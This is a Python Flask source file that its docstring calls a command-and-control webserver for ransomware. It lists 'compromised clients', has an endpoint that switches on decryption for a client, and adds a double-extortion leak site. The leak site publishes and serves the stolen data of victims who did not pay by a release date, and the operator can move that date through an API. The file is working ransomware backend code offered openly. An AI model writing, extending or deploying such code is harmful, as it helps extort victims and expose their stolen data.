"""Command and Control webserver 

A Webserver that is uesed for Command and Control tasks of Malware/Ransomware.

Further more it can function as a leak / publish webserver for clients which did not pay a ransom.

Data leak feature uses zips.
"""

import datetime
import logging
from datetime import date
from os import path

from Crypto.Random import get_random_bytes
from flask import Flask, render_template, request, send_file
from flask_sqlalchemy import SQLAlchemy

from .datastorage import get_toc_of_zip
from .db import client_class_factory
from flask_session import Session

logger = logging.getLogger(__name__)


def webserver_factory(path_to_db=r"database.db", leaked_data_storage=r"") -> Flask:
    # pylint: disable=no-member
    """Create and return a Flask instance.

    Args:
        path_to_db (regexp, optional): _description_. Defaults to r"database.db".
        leaked_data_storage (str, optional): _description_. Defaults to "".

    Returns:
        Flask: The webserver object.
    """

    app = Flask(__name__)
    app.secret_key = get_random_bytes(32)
    app.config["SESSION_TYPE"] = "filesystem"
    # configure the SQLite database, relative to the app instance folder
    app.config["SQLALCHEMY_DATABASE_URI"] = r"sqlite:///" + path_to_db

    database = SQLAlchemy(app)
    Client = client_class_factory(database.Model)  # pylint: disable=C0103
    Session(app)

    @app.template_filter("date")
    def _jinja2_filter_date(date_to_convert):
        return date_to_convert.isoformat(sep=" ", timespec="hours").split(" ")[0]

    @app.template_filter("datetime")
    def _jinja2_filter_datetime(date_to_convert):
        return date_to_convert.isoformat(sep=" ", timespec="minutes")

    # Add subpaths for double extortion.
    flag_leak_data = leaked_data_storage != ""

    if flag_leak_data:
        app.logger.info(
            "Using double extortion (leak data). Looking in %s for leaked data",
            leaked_data_storage,
        )

        # Main leak page of all clients.
        @app.route("/leak/")
        def leak():
            clients_found = Client.query.all()
            app.logger.info("Found %s leaked clients to display.", len(clients_found))
            return render_template(
                "leak.html", dt=datetime.datetime.now(), clients=clients_found
            )

        # Specific page of a client.
        @app.route("/leak/<guid>")
        def leak_client(guid):
            client_found = Client.query.filter_by(guid=guid).first()
            app.logger.info("Display details of client: %s ", client_found)
            if client_found is None:
                return "bad request!"

            resource = path.join(leaked_data_storage, client_found.guid + ".zip")
            publish = False

            # Not payed but time left to pay
            data = ""
            if (
                client_found.payed_at is None
                and date.today() < client_found.release_date_of_data.date()
            ):
                publish = False
            # Payed in time.
            elif (
                client_found.payed_at is not None
                and client_found.payed_at.date()
                < client_found.release_date_of_data.date()
            ):
                publish = False
            else:
                if path.isfile(resource):
                    data = get_toc_of_zip(resource)
                    publish = True
                else:
                    publish = False


            return render_template(
                "leaked_client.html",
                client=client_found,
                publish=publish,
                dt=datetime.datetime.now(),
                data=data,
            )

        # Download leaked files of the given client.
        @app.route("/api/leak-file/<guid>")
        def api_client(guid):
            client_found = Client.query.filter_by(guid=guid).first()
            app.logger.info("Download leaked data of client: %s ", client_found.guid)

            if client_found is None:
                return "bad request!"

            # Did not pay at all
            if (client_found.payed_at is None and date.today() >= client_found.release_date_of_data.date()):
                resource = path.join(leaked_data_storage, client_found.guid + ".zip")
                if path.isfile(resource):
                    return send_file(resource, as_attachment=True)
            return "No resource"

        # API path to change the date of data leak release.
        @app.route("/publish/<guid>", methods=["PATCH"])
        def publish(guid):
            client_found = Client.query.filter_by(guid=guid).first()
            json = request.get_json()
            json = datetime.datetime.strptime(json["date"], "%Y-%m-%d")

            app.logger.info("%s", json)
            app.logger.info("Enabling download of leaked data from %s", client_found)
            client_found.release_date_of_data = json
            database.session.commit()
            return "ok"

    else:
        app.logger.info("Not using double extortion (leak data)")

    # Main page for controlling the clients.
    @app.route("/")
    def main():
        clients_found = Client.query.all()
        app.logger.info("Number of compromised clients:%s", len(clients_found))
        return render_template(
            "main.html",
            clients=clients_found,
            dt=datetime.datetime.now(),
            flag_leak_data=flag_leak_data,
        )

    # API path to allow decryption.
    @app.route("/decrypt/<guid>", methods=["PATCH"])
    def decrypt(guid):
        client_found = Client.query.filter_by(guid=guid).first()

        app.logger.info("Enabling decryption of %s", client_found)
        client_found.decrypt = True
        database.session.commit()

        return "ok"

    return app


if __name__ == "__main__":
    webserver_factory(
        path_to_db=r"C:\<path to>\database.db",
        leaked_data_storage=r"C:\<path to zip directory>\\",
    ).run(debug=True)
